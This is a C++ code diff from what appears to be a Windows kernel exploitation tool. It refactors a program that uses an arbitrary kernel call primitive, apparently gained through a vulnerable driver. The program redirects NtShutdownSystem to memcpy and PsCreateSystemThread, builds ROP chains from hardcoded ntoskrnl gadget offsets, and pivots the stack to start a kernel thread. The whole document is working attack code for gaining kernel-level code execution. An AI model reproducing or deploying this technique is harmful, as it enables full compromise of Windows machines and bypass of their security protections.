@@ -19,16 +19,23 @@ int main()
         return EXIT_FAILURE;
     }
 
-    const std::string WindowsBuild = Utils::GetWindowsDisplayVersion();
-    if (WindowsBuild.empty())
+    Globals::WindowsBuild = Utils::GetWindowsDisplayVersion();
+    if (Globals::WindowsBuild.empty())
     {
         std::exception("Failed to find the windows build being used");
         return EXIT_FAILURE;
     }
 
-    std::printf("[+] Windows build: %s\n", WindowsBuild.c_str());
+    Globals::KernelBase = Driver::GetKernelModuleBase();
+    if (!Globals::KernelBase)
+    {
+        std::exception("Failed to find ntoskrnl.exe base");
+        return EXIT_FAILURE;
+    }
+
+    std::printf("[+] Windows build: %s\n", Globals::WindowsBuild.c_str());
     std::printf("[+] New thread address to be used @ 0x%p\n", RandomValidThreadAddress);
-    std::printf("[+] ntoskrnl.exe @ 0x%p\n", Driver::GetKernelModuleBase());
+    std::printf("[+] ntoskrnl.exe @ 0x%p\n", Globals::KernelBase);
 
     Driver::ArbitraryCaller KernelCaller = Driver::ArbitraryCaller();
 
@@ -58,17 +65,17 @@ int main()
     HANDLE UmEvent = CreateEventW(NULL, FALSE, FALSE, L"Global\\MYSIGNALEVENT");
     std::printf("[+] Usermode event handle: %x\n", UmEvent);
 
-    StackManager MainStackManager(Driver::GetKernelModuleBase(), (std::uintptr_t)MainStackAllocation + 0x2000, 0x2000);
-    StackManager InitStackManager(Driver::GetKernelModuleBase(), (std::uintptr_t)InitStackAllocation + 0x2000, 0x2000);
+    StackManager MainStackManager(Globals::KernelBase, (std::uintptr_t)MainStackAllocation + 0x2000, 0x2000);
+    StackManager InitStackManager(Globals::KernelBase, (std::uintptr_t)InitStackAllocation + 0x2000, 0x2000);
 
     // Open handle to usermode event in the kernel
     InitStackManager.AddFunctionCall("RtlInitUnicodeString", (std::uint64_t)DestinationStringArg, (std::uint64_t)SourceStringArg);
     InitStackManager.AddFunctionCall("ZwOpenEvent", (std::uint64_t)OutputHandleArg, EVENT_MODIFY_STATE | SYNCHRONIZE, (std::uint64_t)ObjectAttributeArg);
     InitStackManager.PivotToNewStack(&MainStackManager);
 
-    // set first and second arg
+    // set first arg
     MainStackManager.ReadIntoRcx((std::uint64_t)OutputHandleArg);
-
+    // set second arg
     MainStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
     MainStackManager.AddPadding(0x10);
     MainStackManager.AddValue(TRUE, "SecondArg");
@@ -85,7 +92,7 @@ int main()
 
     std::uint64_t CurrentStackOffsetStartValue = 0x2000;
 
-    void* PivotJumpAddress = (void*)(Driver::GetKernelModuleBase() + 0x20043b);
+    void* PivotJumpAddress = (void*)(Globals::KernelBase + 0x20043b);
     void* NewRspAddress = (void*)((uint64_t)InitStackAllocation + 0x2000);
 
     KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
@@ -102,7 +109,7 @@ int main()
     std::cin.get();
 
     // mov rdx, qword ptr [rcx + 0x50]; mov rbp, qword ptr [rcx + 0x18]; mov rsp, qword ptr [rcx + 0x10]; jmp rdx;
-    void* BootstrapGadget = (void*)(Driver::GetKernelModuleBase() + 0x698bd0);
+    void* BootstrapGadget = (void*)(Globals::KernelBase + 0x698bd0);
 
     HANDLE KernelThreadHandle;
     KernelCaller.RedirectCallByName("NtShutdownSystem", "PsCreateSystemThread", (void*)NULL, (void*)BootstrapGadget, PivotDataAllocation);
